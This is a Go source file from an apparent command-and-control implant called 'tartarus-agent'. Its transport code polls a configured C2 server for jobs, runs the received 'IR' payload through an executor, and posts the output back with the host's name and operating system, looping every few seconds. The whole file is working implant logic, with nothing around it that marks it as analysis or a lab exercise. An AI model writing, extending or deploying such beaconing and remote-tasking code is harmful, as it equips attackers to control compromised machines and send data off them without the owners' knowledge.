package transport

import (
	"bytes"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"runtime"
	"time"

	"tartarus-agent/config"
	"tartarus-agent/executor"
)

// JobResponse models a pending job returned from the server.
type JobResponse struct {
	JobID       string `json:"job_id"`
	PayloadURL  string `json:"payload_url"`
	EncAESKey   string `json:"enc_aes_key"`
	ExecMode    string `json:"exec_mode"`
	ResultR2Key string `json:"result_r2_key"`
	IR          []byte `json:"ir"`
}

// JobResult represents the result produced by the agent.
type JobResult struct {
	JobID     string `json:"job_id"`
	AgentID   string `json:"agent_id"`
	Status    string `json:"status"`
	Message   string `json:"message"`
	Hostname  string `json:"hostname"`
	OS        string `json:"os"`
	Timestamp string `json:"timestamp"`
}

// submitResult sends the completed job result back to the backend.
func submitResult(cfg config.AgentConfig, result JobResult) error {
	url := fmt.Sprintf(
		"%s/results/submit",
		cfg.C2BaseURL,
	)

	data, err := json.Marshal(result)
	if err != nil {
		return err
	}

	resp, err := http.Post(
		url,
		"application/json",
		bytes.NewBuffer(data),
	)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return fmt.Errorf(
			"result submission failed: HTTP %d",
			resp.StatusCode,
		)
	}

	log.Printf(
		"[TARTARUS-AGENT] Result submitted for job %s",
		result.JobID,
	)

	return nil
}

func pollJobs(cfg config.AgentConfig) error {
	url := fmt.Sprintf(
		"%s/jobs/pending/%s",
		cfg.C2BaseURL,
		cfg.AgentID,
	)

	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusNotFound {
		log.Printf("[TARTARUS-AGENT] No pending jobs")
		return nil
	}

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf(
			"job polling failed: HTTP %d",
			resp.StatusCode,
		)
	}

	var job JobResponse

	if err := json.NewDecoder(resp.Body).Decode(&job); err != nil {
		return err
	}

	log.Printf(
		"[TARTARUS-AGENT] Job received: %s (mode=%s)",
		job.JobID,
		job.ExecMode,
	)

	log.Printf(
		"[TARTARUS-AGENT] Executing JOCKY IR for job %s",
		job.JobID,
	)

	irResult, err := executor.ExecuteIR(
		job.IR,
		job.ExecMode,
	)

	if err != nil {
		log.Printf(
			"[TARTARUS-AGENT] IR execution failed: %v",
			err,
		)

		return err
	}

	log.Printf(
		"[TARTARUS-AGENT] IR execution successful: %s",
		string(irResult),
	)

	hostname, err := os.Hostname()
	if err != nil {
		hostname = "unknown"
	}

	result := JobResult{
		JobID:     job.JobID,
		AgentID:   cfg.AgentID,
		Status:    "success",
		Message:   string(irResult),
		Hostname:  hostname,
		OS:        runtime.GOOS,
		Timestamp: time.Now().UTC().Format(time.RFC3339),
	}

	if err := submitResult(cfg, result); err != nil {
		return err
	}

	return nil
}

// StartPollLoop starts the periodic job polling loop.
func StartPollLoop(cfg config.AgentConfig) {
	log.Printf(
		"[TARTARUS-AGENT] Starting job polling for agent %s",
		cfg.AgentID,
	)

	interval := time.Duration(cfg.PollMin) * time.Second

	if interval <= 0 {
		interval = 2 * time.Second
	}

	for {
		if err := pollJobs(cfg); err != nil {
			log.Printf(
				"[TARTARUS-AGENT] Poll error: %v",
				err,
			)
		}

		time.Sleep(interval)
	}
}
